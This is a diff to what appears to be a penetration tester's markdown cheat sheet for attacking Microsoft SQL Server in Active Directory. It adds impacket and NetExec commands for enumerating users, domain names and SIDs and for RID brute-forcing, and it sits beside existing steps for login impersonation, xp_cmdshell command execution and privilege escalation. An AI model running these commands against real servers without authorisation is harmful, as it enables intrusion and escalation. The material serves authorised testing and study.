@@ -32,11 +32,28 @@ mssqlclient.py -k -no-pass $Full_Domain
 # login as different user
 exec_as_login <username here>
 
-# check databases
+# Enum databases
 enum_db
+
+# Enum user
+enum_users
 
 # check linked servers
 enum_links
+
+# Enum Domain Name and Server Name
+SELECT Default_domain();
+SELECT @@SERVERNAME;
+
+# Sid
+SELECT SUSER_SID('Username')
+select SUSER_SNAME(SID_BINARY(N'Put Raw SID Here'))
+
+>>> python3
+>>> from impacket.dcerpc.v5.dtypes import SID
+>>> raw_sid = 'Put Raw SID'
+>>> admin = SID(bytes.formhex(raw_sid))
+>>> admin.formatCanonical()
 ```
 ### Database usage 
 ```bash
@@ -62,17 +79,22 @@ EXEC xp_cmdshell 'whoami';
 ```
 
 ## Common Check's
+### Rid-Brute 
+```json
+nxc mssql $ip -u '$user' -p '$pass' --rid-brute 2000 # max
+```
+
 ### Logged in users:
 ```bash
-nxc mssql DC01 -u '$user' -p '$pass' --local-auth -M enum_logins
+nxc mssql $ip -u '$user' -p '$pass' --local-auth -M enum_logins
 ```
 ### check impersonate user
 ```bash
-nxc mssql DC01 -u '$user' -p '$pass' --local-auth -M enum_impersonate
+nxc mssql $ip -u '$user' -p '$pass' --local-auth -M enum_impersonate
 ```
 ### impersonate user
 ```bash
-nxc mssql DC01 -u '$user' -p 'pass' --local-auth -M mssql_priv
+nxc mssql $ip -u '$user' -p 'pass' --local-auth -M mssql_priv
 ```
 # Reading
 ##  Reading  $SID
